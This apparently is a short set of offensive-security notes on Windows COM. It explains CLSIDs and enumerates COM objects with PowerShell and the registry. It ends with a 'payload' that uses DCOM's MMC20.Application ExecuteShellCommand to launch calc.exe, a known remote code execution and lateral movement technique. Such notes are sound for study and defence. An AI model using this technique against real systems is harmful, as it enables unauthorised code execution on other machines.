## Component Object Model (COM)

 is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-enabled components), as well as others.

* `CLSID – The Class Identifier (CLSID)` is a Global Unique Identifier (GUID). Windows stores a CLSID for each installed class in a program. When you need to run a class, you need the correct CLSID, so Windows knows where to go and find the program.
  * `oleview.exe` 

searching some COM Objects available and that can allows us to Execute code on the local machine.

`Powershell`

```powershell
Get-CimInstance -ClassName Win32_ComApplication
```

```
Get-CimInstance -ClassName Win32_ComApplication -property * | select-string shellwindows
```

`registry`

```cmd
Computer\HKEY_CLASSES_ROOT\CLSID
```

### Explorer

```cmd
explorer /e,::{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}
```

https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html

https://www.elevenforum.com/t/list-of-windows-11-clsid-key-guid-shortcuts.1075/

##### Allowed App

```cmd
explorer "shell:::{4026492F-2F69-46B8-B9BF-5654FC07E423}\pageConfigureApps"
```

### payload - DCOM

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1")
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Calc.exe",$null,$null,"7")
```